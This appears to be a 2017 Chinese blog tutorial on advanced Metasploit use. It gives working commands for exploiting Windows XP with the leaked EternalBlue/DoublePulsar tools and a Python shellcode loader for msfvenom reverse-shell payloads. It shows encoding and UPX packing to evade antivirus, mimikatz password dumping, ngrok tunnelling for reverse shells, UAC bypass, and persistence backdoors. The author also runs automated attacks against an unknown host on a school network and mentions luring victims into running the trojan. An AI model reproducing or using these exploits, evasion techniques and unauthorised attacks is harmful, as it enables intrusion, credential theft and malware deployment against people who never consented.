---
layout:     post
title:      Metasploit渗透测试工具（二）
subtitle:   进阶篇
date:       2017-12-1
author:     volcanohatred
header-img: img/articles/metasploit/title.png
catalog: true
tags:
    - 工具
    - 渗透测试
---  

## 进阶教程
前面讲了讲Metasploit的基础用法，但是在实际渗透测试中，那些基础用法可能不太适用，下面列举比较实用的高级应用场景和技巧。
### 4.1msf+shadowbroker-master
 ms17010是2017年的一个神级smb漏洞，上文介绍了msf利用ms17010对win7电脑的一次入侵，但是msf里面的ms17010的exp支持的系统有限，只支持win7和win2008，但是在渗透测试中，会遇到很多winxp和win2003这样的主机。所以，对后两个系统的利用可以借助ms17010的原始工具包shadowbroker-master,因为msf里面ms17010的模块也是通过它移植出来的。  
**Shadowbrokermaster工具介绍：**  
在2016 年 8 月有一个 “Shadow Brokers” 的黑客组织号称入侵了方程式组织窃取了大量机密文件，并将部分文件公开到了互联网上，方程式（Equation Group）据称是 NSA（美国国家安全局）下属的黑客组织，有着极高的技术手段。这部分被公开的文件包括不少隐蔽的地下的黑客工具。另外 “Shadow Brokers” 还保留了部分文件，打算以公开拍卖的形式出售给出价最高的竞价者，“Shadow Brokers” 预期的价格是 100 万比特币（价值接近5亿美元）。而“Shadow Brokers” 的工具一直没卖出去。  
2017 年 4 月 8 日，“Shadow Brokers” 公布了保留部分的解压缩密码，有人将其解压缩后的上传到Github网站提供下载。  
2017 年 4 月 14 日晚，继上一次公开解压密码后，“Shadow Brokers” ，在推特上放出了第二波保留的部分文件，下载地址为https://yadi.sk/d/NJqzpqo_3GxZA4，解压密码是 “Reeeeeeeeeeeeeee”。 此次发现其中包括新的23个黑客工具。  
下图为shadowbroker-master工具所影响的系统版本：    
![影响版本](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片1.png)
![影响版本](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片2.png)  
可以看出里面有很多exp，永恒之蓝就是其中之一。从图中可知，对xp的攻击可以利用eternalblue，对win2003的攻击可以利用eternalromance，对win8的攻击可以利用eternalsynergy  
下来演示利用shadowbroker-master对WinXp的攻击：  
*环境（python2.6+，pywin32，shadowbroker-master工具都以给出。）*  
以下为我在虚拟机下操作：  
```
目标机：192.168.106.129
攻击机：192.168.106.133
接收shell主机：192.168.106.1(真实机地址)
```  
在攻击机上打开cmd切换到python目录输入命令：
Python shadowbroker-master目录\windows\fb.py  
![永恒之蓝](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片3.png)  
打开后在如下图填写参数：  
![永恒之蓝](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片4.png)  
Use redirction填写no
Base log directory：填写一个日志保留地址
然后下一步：  
![永恒之蓝](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片5.png)  
一路回车，直到出现target。选择：0  
![永恒之蓝](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片6.png)  
下一步：  
![永恒之蓝](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片7.png)  
Mode选择：1>FB
然后回车就行：  
![永恒之蓝](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片8.png)  
可以看出后门安装成功：
然后输入命令：
use doublepulsar  
![永恒之蓝](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片9.png)  
一路回车；  
![永恒之蓝](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片10.png)  
需要填写的参数如上，x86/x64按照目标主机来定，function选择2）rundll
即把一个而已dll注入目标主机，然后目标主机执行dll并连接到接受shell的主机，现在利用msf生成一个恶意dll：
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.106.1 lport=6666 -f dll>c:\\winxp.dll
将生成的dll放到攻击机里面，然后在dllpayload里面填写dll路径：  
![永恒之蓝](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片11.png)  
然后在接受shell主机里面开启msf监听：  
![永恒之蓝](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片12.png)  
在攻击机里面一路回车：  
![永恒之蓝](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片13.png)  
如上图，dll注入成功，并且监听机收到会话：  
![永恒之蓝](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片14.png)  
这样，利用shadowbroker-master工具对winxp的攻击就完成了。   
![永恒之蓝](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片15.png)  
### 4.2msf+nmap实现全自动攻击
在选择模块的时候，我们可能会发愁，这么多的模块怎么去选择，这时我们可以借助自动化攻击，db_autopwn，这个模块很早之前已被革除，但是现在我们可以下载这个模块，添加至msf目录进行调用。  
postgresql启动  
```
service postgresql start
kali2.0需要配置数据库，kali3.0中启动数据库后直接在终端中输入msfconsole，进入后即自动连接数据库。
Kali2.0数据库配置
su postgres
createuser –P  volcano 
createdb --owner=volcano volcano
(以上配置3.0可忽略)
su –
msfconsole
db_status
```  
**实战演示**：（在我的虚拟机里，目标主机xpsp3,ip地址：192.168.106.129；win2003，IP地址192.168.106.133）
db_nmap是nmap的封装，可以自动把扫描结果导入到数据库中，方便下一步的攻击:  
![autopwn](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片16.png)  
```
附录：
db_autopwn参数：
22.-t显示所有匹配的exploit模块
23.-x根据漏洞引用选择模块
24.-p选择基于开放端口的模块
25.-e针对所有匹配的目标启动攻击
26.-r使用反向连接外壳
27.-b在随机端口上使用绑定shell（默认）
28.-q禁用exploit模块输出
29.-R [等级]只运行最低等级的模块
30.-I [范围]只利用这个范围内的主机
31.-X [范围]始终排除此范围内的主机
32.-PI [范围]只有利用打开这些端口的主机
33.-PX [范围]始终排除打开这些端口的主机
34.-m [regex]只运行名称与正则表达式匹配的模块
35.-T [秒]任何攻击的最大运行时间，以秒为单位
Nmap常用基础参数：（详见nmap内部教程）
1.-sT	 TCP connect()扫描，这种方式会在目标主机的日志中记录大批连接请求和错误信息。
2.-sS	 半开扫描，很少有系统能把它记入系统日志。不过，需要Root权限。
3.-sF  -sN	 秘密FIN数据包扫描、Xmas Tree、Null扫描模式
4.-sP	 ping扫描，Nmap在扫描端口时，默认都会使用ping扫描，只有主机存活，Nmap才会继续扫描。
5.-sU	 UDP扫描，但UDP扫描是不可靠的
6.-sA	 这项高级的扫描方法通常用来穿过防火墙的规则集
7.-sV	 探测端口服务版本
8.-Pn	 扫描之前不需要用ping命令，有些防火墙禁止ping命令。可以使用此选项进行扫描
9.-v	 显示扫描过程，推荐使用
10.-h	 帮助选项，是最清楚的帮助文档
11.-p	 指定端口，如“1-65535、1433、135、22、80”等
12.-O	 启用远程操作系统检测，存在误报
13.-A	 全面系统检测、启用脚本检测、扫描等
14.-oN/-oX/-oG	 将报告写入文件，分别是正常、XML、grepable 三种格式
15.-T4	 针对TCP端口禁止动态扫描延迟超过10ms
16.-iL	 读取主机列表，例如，“-iL C:\ip.txt”
```  
因为已导入数据库，所以直接自动攻击：
db_autopwn –p –t –e  
![autopwn](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片17.png)
![autopwn](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片18.png)  
结果发现没有返回的会话。现在对学校一个未知主机进行攻击（ip：10.79.50.205）  
![autopwn](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片19.png)  
当然这个模块的攻击是不准确的，而且成功率也不高。可以适当性的把每个模块的攻击时间间隔加大，可提高准确性。
### 4.3msf+python制作免杀木马
木马免杀方法很多，有编译，加壳，加花（修改特征码）但是经过实践发现：脚本语言嵌入恶意荷载并且编译成exe进行免杀，效果较好且制作比较方便，因为python比较流行，就讲讲msf+python实现免杀：  
*准备环境（python2.6+，pywin32，pyinstaller)*
利用msfvenom生成恶意荷载：（新版msf中msfvenom替代了msfpayload和msfencode）  
msfvenom -p windows/meterpreter/reverse_tcp LPORT=(自定义) LHOST=(自定义) -f py >输出路径  
1.将生成的恶意荷载代码放入下面代码中  
2.替换下面代码的“恶意荷载”然后保存为.py格式  
```
from ctypes import *
import ctypes
恶意荷载
# libc = CDLL('libc.so.6')
PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4
def executable_code(buffer):
    buf = c_char_p(buffer)
    size = len(buffer)
    addr = libc.valloc(size)
    addr = c_void_p(addr)
    if 0 == addr:
        raise Exception("Failed to allocate memory")
    memmove(addr, buf, size)
    if 0 != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):
        raise Exception("Failed to set protection on buffer")
    return addr
VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc
VirtualProtect = ctypes.windll.kernel32.VirtualProtect
shellcode = bytearray(buf)

whnd = ctypes.windll.kernel32.GetConsoleWindow()
if whnd != 0:
    if 666 == 666:
        ctypes.windll.user32.ShowWindow(whnd, 0)
        ctypes.windll.kernel32.CloseHandle(whnd)
print ".................................." * 666
memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
old = ctypes.c_long(1)
VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)), 0x40, ctypes.byref(old))
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),buf,ctypes.c_int(len(shellcode)))
shell = cast(memorywithshell, CFUNCTYPE(c_void_p))
shell()
```  
3.解压pyinstaller2.0，然后打开cmd，cd到python安装目录（如果添加了环境变量则忽略）输入:
python pyinstaller安装目录\pyinstaller2.0.py --onfile --noconsole 保存的.py路径
1.Pyinstaller命令相关参数:  
```
-F   表示生成单个可执行文件
-W  表示去掉控制台窗口，这在GUI界面是非常有用。不过如果是命令行程序的话那就删除这个选项！
-p    表示你自己定义需要加载的类路劲，一般情况下用不到
-i     表示可执行文件的图标
```  
上面命令--onefile等同于-F，--noconsole等同于-W  
![免杀](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片20.png)  
这样即制作成功，在pyhton安装目录下找到dist目录，里面保留了生成的exe免杀木马。  
4.免杀验证：
用virustotal进行云查杀：  
http://www.virustotal.com/
只有18个杀毒软件报毒，很正常,因为这只是初步制作。  
![免杀](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片21.png)  
进行更深层的免杀操作：
对恶意荷载进行编码：
msfvenom -p windows/meterpreter/reverse_tcp LPORT=(自定义) LHOST=(自定义) -e x86/shikata_ga_nai -i (编译次数) -f py >输出路径
多种编码格式多次编译：
msfvenom -p windows/meterpreter/reverse_tcp LPORT=(自定义) LHOST=(自定义) -e x86/shikata_ga_nai -i (编译次数) -f raw|msfvenom -e (另一种编码格式）-i (编译次数) -f py >输出路径
输入查看可用编译方式，有的不适用windows
msfvenom –l –encoders  
![免杀](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片22.png)  
现在进行一种编码x86/shikata_ga_nai编码11次（因为网上说shikata_ga_nai编码免杀效果好）生成的exe在virustotal查杀：  
![免杀](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片23.png)  
结果发现少了很多，只有三个杀软报毒，下面再进行加壳处理：
介绍一款加壳工具：  
![免杀](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片24.png)  
UPX是比较出名的加壳软件，使用ucl压缩算法，并且免杀效果很好！
相关upx命令参数：  
![免杀](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片25.png)  
可以看出
-1压缩更快-9压缩更好
现在对刚才进行编码处理的exe进行加壳：
现在进行简单的加壳（在kali3上的操作，win平台我没下载）：  
![免杀](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片26.png)  
upx -5 –o 要覆盖的文件路径 目标文件路径
然后把加壳的v5.exe进行云查杀：  
![免杀](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片27.png)  
可以看出，全球各大杀软都没查出这是木马！这样一个免杀的木马就做出来了，后续的操作当然就是捆绑加诱导目标运行这个木马了，这里不再深入！当然木马的免杀还可以修改特征码达到免杀，但是每个杀软公司都有自己的病毒识别特征码，所以修改特征码局限性比较大，只能针对某个指定公司，而且门槛比较高。总之，免杀还是这种效果好！！！
### 4.4msf+mimikatz提取目标明文密码
Mimikatz俗称法国神器，是一个轻量级的调试工具，功能很多，不但可以进行域身份的伪造还可以抓取内存中的明文密码，抓密码的原理是从lsass.exe进程中直接获取密码信息进行破解，而且该破解非暴力破解，而是直接根据算法进行反向计算，所以再复杂的密码也会被破解！  
支持的版本：  
```
1.Windows XP (部分可以)
2.Windows Server 2003
3.Windows Server 2008
4.Windows Vista
5.Windows 7
6.Windows 7 SP1
``` 
因为msf里面封装了mimikatz，所以当拿到shell后直接可以进行操作：
（在我的虚拟机里面进行模拟）
前提是反弹到了meterpreter会话，即后渗透阶段：  
![mimikatz](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片28.png)  
命令：
load mimikatz
kerberos  
![mimikatz](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片29.png)  
直接提到明文密码！！  
对于不支持的主机版本，比如win8等版本，可以将会话提升到管理员或者系统权限，然后提取hash：  
命令：hashdump（低版本win）
对于高版本windows，可以输入命令：  
smart_hashdump
run windows/gather/smart_hashdump
提取到的hash可以去md5站破解（ntlm），当然不一定能解密出来，对于复杂密码，我们可以进行hash传递攻击：
use exploit/windows/smb/psexec  
（此处不再演示）
用途：主要用于局域网服务器中，因为局域网服务器基本上密码相同，获取其中一个hash即可入侵局域网中和本主机相同登录密码的主机。  
### 4.5msf+ngrok穿透内网
很多人在用msf进行渗透测试的过程中，因为没有公网地址或者固定的ip地址，导致使用msf离不开自己的局域网，把一个渗透神器的格局缩小了，现在介绍一下如何使用msf+ngrok，将msf变成纵横互联网的大杀器！  
![ngrok](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片30.png)  
ngrok 是一个反向代理，将某个数据流连接到一个公共端点，然后再通过这个公共端点反向连接到本地某个端口，因为ngrok每次使用的外网地址会变化，而sunny-ngrok因为每次是固定外网地址，所以使用sunny-ngrok来实现内网穿透。
使用方法：1.https://www.ngrok.cc注册账号  
![ngrok](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片31.png) 
![ngrok](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片32.png)  
进入隧道管理，然后点开通隧道，选“香港Ngrok 200M VIP服务器”或“香港Ngrok免费服务器”。  
![ngrok](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片33.png)  
以付费服务器为例：  
![ngrok](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片34.png)  
注册完成后进去隧道管理：  
![ngrok](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片35.png)  
记住自己申请的隧道号，然后打开下载文件夹：  
![ngrok](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片36.png)  
打开启动工具：  
![ngrok](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片37.png)
![ngrok](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片38.png)  
看到在线及连接成功！  
![ngrok](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片39.png)  
应用：这样即端口转发成功。在msf中，pyload的lhost的填写即可写为：viphk.ngrok.org，lport填写自己当时申请的端口号，以我的为例，为16247  
![ngrok](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片40.png)  
然后打开另一个msfconsole：进行端口侦听：  
![ngrok](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片41.png)  
此处lport填写自己注册的端口号。我当时申请的6666，就写6666。
这样就实现了msf局域网的限制。
### 4.6Meterpreter后渗透专题
在渗透测试中，提权与免杀是一个永恒的话题，在利用meterpreter返回的会话中，我们会面对三个问题，一是权限不过，无法对目标进行过多操作；二是在操作中会被杀软识别并且报警，三当然是会话的维持，这点对进入内网渗透时用到的跳板主机尤为重要！  
#### 4.6.1 Meterpreter会话提权
对meterpreter的提权大多数限于msf木马的提权，因为大多数exploit利用成功后返回的会话权限很高，不是管理员就是系统权限，无须进行此步操作。这里的提权是对普通用户进行系统的提权，即从普通用户到系统权限。  
在win7之前，提权基本一条命令就会搞定：getsystem（利用ms09-012和ms10-015漏洞进行提权）但是对于较高系统版本，这个命令毫无用处（因为高版本不会存在ms09-012和ms10-015这样陈旧的漏洞）。在win8主机上进行操作:  
![后渗透](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片42.png)  
当然模块里里面还有很多可供提权的模块：（不免杀）
1.绕过UAC验证：
UAC（用户帐户控制，应用程序和任务总是在非管理员帐户的安全上下文中运行，但管理员专门给系统授予管理员级别的访问权限时除外。UAC 会阻止未经授权应用程序的自动安装，防止无意中对系统设置进行更改。换句话说，就是平时我们以管理员的身份运行某个程序）  
![后渗透](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片43.png)  
利用演示：（win8主机）  
在没有进行绕过之前，我输入getsystem  
![后渗透](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片44.png)  
现在另外打开一个msfconsole，进行监听：（不要和已经侦听的端口重复！）  
![后渗透](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片45.png)  
在第一个已经得到的会话中，输入background将会话隐藏  
![后渗透](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片46.png)  
然后载入提权模块：
use exploit/windows/local/bypassuac  
![后渗透](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片47.png)  
这里还要设置payload，payload类型与上面第二个监听类型一样：（如果没设置会返回一个类似cmd的shell）  
![后渗透](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片48.png)  
然后run：
结果如下图，输入getsystem直接得到系统权限：  
![后渗透](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片49.png)  
2.利用漏洞提权：  
![后渗透](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片50.png)  
漏洞提权的操作和那个相似，也会返回一个新的会话。  
相关模块还有很多，大家可以去exploit/windows/local里面去找。当然如果有目标主机的控制权，可以以管理员身份运行木马，这样提权比较方便。
#### 4.6.2 Meterpreter免杀对抗

1.对抗流量监测  
前面讲的对木马的免杀处理是为了躲避杀软的静态检查，现在来说说如何躲避杀软的流量监测，因为meterpreter在渗透领域的出名度，导致了它的免杀脆弱性，各大杀软都会对它进行分析与查杀，虽然meterpreter网络通信协议采用tlv封装，但是因为其传输的特征码，仍会被流量监测发现：  
![流量](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片51.png)
![流量](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片52.png)
![流量](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片53.png)
![流量](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片54.png)  
总之一句话，meterpreter传输的数据包有固定特征值，可以被监测出来！在对付一些对meterpreter进行流量监测的杀软中（金山就是这种机制）我们可以对meterpreter的流量进行加密：
在设置meterpreter的payload时，添加参数：
set EnableStageEncoding true
set StageEncoder x86/xor(编码格式很多，如下，可随便选取)
set exitonsession false（必填项！）  
![流量](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片55.png)  
这样就实现了对数据流的加密
在win8上进行演示：  
![流量](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片56.png)  
可以看出，meterpreter对数据流进行了加密。这样就避开了一些杀软的流量监测，在渗透测试中起到了很好的隐蔽性。
对抗行为分析
对抗行为分析在国内最烦人的就是360了，360在行为分析方面做得的确很好，比如现在拿到了sessions会话，我们打开目标摄像头：

cmd里net user：


利用漏洞进行提权时：

会话维持时：

所以说对于这种行为分析，的确让人很棘手，所以最后的办法就是想办法关闭360了（zhudongfangyu.exe）。
攻略：

4.6.3 Meterpreter会话维持

meterpreter会话维持最基本的两个模块：
Persistence（对注册表进行操作，免杀效果极差）  
![维持](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片61.png)  
命令：run persistence –X（开机自启） –i (回连时间间隔)–p（回连端口）-r（回连ip地址） 
Metsvc
命令：run metsvc
这个模块实在目标机装一个名为meterpreter的服务，然后可以对目标进行回连
回连命令：  
```
msfconsole
Use exploit/multi/handler
Set payload windows/metsvc_bind_tcp 
set LPORT 31337
set RHOST 目标ip
```  
 当然这两个命令是不可能免杀的，对没装杀软的主机可以实行，比较方便。
对有杀软的主机，可以上传我们制作的免杀木马并且让他开机自启就行：
Winxp：
将免杀马放入程序---附件---启动里面，然后目标主机每次开机都会启动我们的免杀马，并回连shell
其他较高版本：（来自互联网）  
![维持](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片62.png)  
Msf之mof后门（现已无法免杀）
模块已经给出：
将里面的persistence/mof_ps_persist.rb放置到msf安装路径metasploit-framework\embedded\framework\modules\post\windows里面（windows）
在得到会话后，将会话放置到后台，然后输入：  
```
use post/windows/mof_ps_persist
set session (获得的会话id)
set lhosts (本地ip)
set lport (本地端口)
```  
即可。  